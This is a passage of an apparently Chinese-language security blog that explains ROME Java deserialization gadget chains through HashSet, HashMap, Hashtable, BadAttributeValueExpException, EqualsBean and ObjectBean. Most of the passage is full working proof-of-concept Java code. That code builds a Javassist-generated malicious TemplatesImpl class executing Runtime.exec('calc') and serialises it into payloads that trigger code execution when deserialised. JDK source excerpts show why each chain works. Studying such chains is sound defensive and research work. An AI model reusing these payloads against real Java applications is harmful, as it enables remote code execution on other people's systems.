class="line">        setFiled(bean, &quot;_obj&quot;, templateImpl);</span><br><span class="line">        // 序列化</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;EqualsBean.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(table);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;EqualsBean.bin&quot;));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFiled(Object o, String fieldname, Object value) throws Exception &#123;</span><br><span class="line">        Field field = o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么是HashSet</p>
<p>因为他用两个map，来进行对比调用equals</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in any hidden serialization magic</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Read capacity and verify non-negative.</span><br><span class="line">    int capacity = s.readInt();</span><br><span class="line">    if (capacity &lt; 0) &#123;</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal capacity: &quot; +</span><br><span class="line">                                         capacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Read load factor and verify positive and non NaN.</span><br><span class="line">    float loadFactor = s.readFloat();</span><br><span class="line">    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Read size and verify non-negative.</span><br><span class="line">    int size = s.readInt();</span><br><span class="line">    if (size &lt; 0) &#123;</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal size: &quot; +</span><br><span class="line">                                         size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Set the capacity according to the size and load factor ensuring that</span><br><span class="line">    // the HashMap is at least 25% full but clamping to maximum capacity.</span><br><span class="line">    capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),</span><br><span class="line">            HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">    // Create backing HashMap</span><br><span class="line">    map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?</span><br><span class="line">           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           new HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    // Read in all elements in the proper order.</span><br><span class="line">    for (int i=0; i&lt;size; i++) &#123;</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到里面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for (int i=0; i&lt;size; i++) &#123;</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>关键点，就是这个他会for循环调用，他会把我们传进来的东西进行put放进去，然后就就会调用到hashmap的put，然后putval</p>
<p>为什么要然后他是zzyy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">map1.put(&quot;zZ&quot;, templateImpl);</span><br><span class="line">map1.put(&quot;yy&quot;, bean);</span><br><span class="line">map2.put(&quot;zZ&quot;, bean);</span><br><span class="line">map2.put(&quot;yy&quot;, templateImpl);</span><br></pre></td></tr></table></figure>

<p>其实只要保证hash值要相同就行</p>
<p>然后为什么要弄两个，因为后面会到AbstractMap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object o) &#123;</span><br><span class="line">    if (o == this)</span><br><span class="line">        return true;</span><br><span class="line"></span><br><span class="line">    if (!(o instanceof Map))</span><br><span class="line">        return false;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    if (m.size() != size())</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        while (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            if (value == null) &#123;</span><br><span class="line">                if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (!value.equals(m.get(key)))</span><br><span class="line">                    return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (ClassCastException unused) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; catch (NullPointerException unused) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到他的逻辑</p>
<p>关键点在<code>if (!value.equals(m.get(key)))</code></p>
<p>value是map2的值，m是map1，所以(m.get(key)就是第一个的键，他就会调到EqualsBean的equals</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object obj) &#123;</span><br><span class="line">    return this.beanEquals(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public boolean beanEquals(Object obj) &#123;</span><br><span class="line">    Object bean1 = this._obj;</span><br><span class="line">    Object bean2 = obj;</span><br><span class="line">    boolean eq;</span><br><span class="line">    if (bean2 == null) &#123;</span><br><span class="line">        eq = false;</span><br><span class="line">    &#125; else if (bean1 == null &amp;&amp; bean2 == null) &#123;</span><br><span class="line">        eq = true;</span><br><span class="line">    &#125; else if (bean1 != null &amp;&amp; bean2 != null) &#123;</span><br><span class="line">        if (!this._beanClass.isInstance(bean2)) &#123;</span><br><span class="line">            eq = false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            eq = true;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);</span><br><span class="line">                if (pds != null) &#123;</span><br><span class="line">                    for(int i = 0; eq &amp;&amp; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                        Method pReadMethod = pds[i].getReadMethod();</span><br><span class="line">                        if (pReadMethod != null &amp;&amp; pReadMethod.getDeclaringClass() != (class$java$lang$Object == null ? (class$java$lang$Object = class$(&quot;java.lang.Object&quot;)) : class$java$lang$Object) &amp;&amp; pReadMethod.getParameterTypes().length == 0) &#123;</span><br><span class="line">                            Object value1 = pReadMethod.invoke(bean1, NO_PARAMS);</span><br><span class="line">                            Object value2 = pReadMethod.invoke(bean2, NO_PARAMS);</span><br><span class="line">                            eq = this.doEquals(value1, value2);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception var10) &#123;</span><br><span class="line">                Exception ex = var10;</span><br><span class="line">                throw new RuntimeException(&quot;Could not execute equals()&quot;, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        eq = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return eq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的EqualsBean的作用和ToStringBean的作用是一样的</p>
<p>为什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFiled(bean, &quot;_beanClass&quot;, Templates.class);</span><br><span class="line">setFiled(bean, &quot;_obj&quot;, templateImpl);</span><br></pre></td></tr></table></figure>

<p>要放在后面，因为前面赋值的话，add会报错，所有反倒后面赋值</p>
<p>根据上面的原理，其实用hashmap也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        // 创建恶意类</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass ctClass = classPool.makeClass(&quot;cccc&quot;);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 创建TemplatesImpl对象</span><br><span class="line">        Object templateImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        setFiled(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">        EqualsBean bean = new EqualsBean(String.class, &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap map1 = new HashMap();</span><br><span class="line">        HashMap map2 = new HashMap();</span><br><span class="line">        map1.put(&quot;yy&quot;, bean);</span><br><span class="line">        map1.put(&quot;zZ&quot;, templateImpl);</span><br><span class="line">        map2.put(&quot;zZ&quot;, bean);</span><br><span class="line">        map2.put(&quot;yy&quot;, templateImpl);</span><br><span class="line">        HashMap map3 = new HashMap();</span><br><span class="line">        map3.put(map1,&quot;1&quot;);</span><br><span class="line">        map3.put(map2,&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">        setFiled(bean, &quot;_beanClass&quot;, Templates.class);</span><br><span class="line">        setFiled(bean, &quot;_obj&quot;, templateImpl);</span><br><span class="line">        // 序列化</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;EqualsBean.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(map3);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;EqualsBean.bin&quot;));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFiled(Object o, String fieldname, Object value) throws Exception &#123;</span><br><span class="line">        Field field = o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>利用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">BadAttributeValueExpException.readObject()</span><br></pre></td></tr></table></figure>

<p>这个就是他反序列化里面有toString</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(&quot;val&quot;, null);</span><br><span class="line"></span><br><span class="line">    if (valObj == null) &#123;</span><br><span class="line">        val = null;</span><br><span class="line">    &#125; else if (valObj instanceof String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; else if (System.getSecurityManager() == null</span><br><span class="line">            || valObj instanceof Long</span><br><span class="line">            || valObj instanceof Integer</span><br><span class="line">            || valObj instanceof Float</span><br><span class="line">            || valObj instanceof Double</span><br><span class="line">            || valObj instanceof Byte</span><br><span class="line">            || valObj instanceof Short</span><br><span class="line">            || valObj instanceof Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix</span><br><span class="line">        val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line">setFiled(badAttributeValueExpException, &quot;val&quot;, 要被tostring的);</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">public class BadAttrExp &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        // 创建恶意类</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass ctClass = classPool.makeClass(&quot;cccc&quot;);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 创建TemplatesImpl对象</span><br><span class="line">        Object templateImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        setFiled(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">        // 创建ToStringBean对象</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class, templateImpl);</span><br><span class="line"></span><br><span class="line">        // 创建BadAttributeValueExpException对象</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line">        setFiled(badAttributeValueExpException, &quot;val&quot;, toStringBean);</span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;BadAttrExp.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;BadAttrExp.bin&quot;));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFiled(Object o, String fieldname, Object value) throws Exception &#123;</span><br><span class="line">        Field field = o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HashMap和ObjetBean组合"><a href="#HashMap和ObjetBean组合" class="headerlink" title="HashMap和ObjetBean组合"></a>HashMap和ObjetBean组合</h3><p>利用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ObjetBean.hashCode()</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>

<p>然是用到hashmap的hashcode</p>
<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">public class ObjectBeanExp &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        // 创建恶意类</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass payload = classPool.makeClass(&quot;dddd&quot;);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        byte[] bytes = payload.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 创建TemplatesImpl对象</span><br><span class="line">        Object templateImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        setFiled(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">        // 创建ToStringBean对象</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class, templateImpl);</span><br><span class="line">        // 创建ObjectBean对象</span><br><span class="line">        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);</span><br><span class="line">        setFiled(objectBean,&quot;_toStringBean&quot;, null);</span><br><span class="line">        setFiled(objectBean, &quot;_cloneableBean&quot;, null);</span><br><span class="line"></span><br><span class="line">        // 创建hashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, &quot;aaaa&quot;);</span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ObjectBean.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;ObjectBean.bin&quot;));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFiled(Object o, String fieldname, Object value) throws Exception &#123;</span><br><span class="line">        Field field = o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HashTable和ObjetBean组合"><a href="#HashTable和ObjetBean组合" class="headerlink" title="HashTable和ObjetBean组合"></a>HashTable和ObjetBean组合</h3><p>利用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">ObjetBean.hashCode()</span><br><span class="line">HashTable.reconstitutionPut()</span><br><span class="line">HashTable.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>

<p>hashtable的readObject里面有reconstitutionPut</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">     throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    // Read in the length, threshold, and loadfactor</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Read the original length of the array and number of elements</span><br><span class="line">    int origlength = s.readInt();</span><br><span class="line">    int elements = s.readInt();</span><br><span 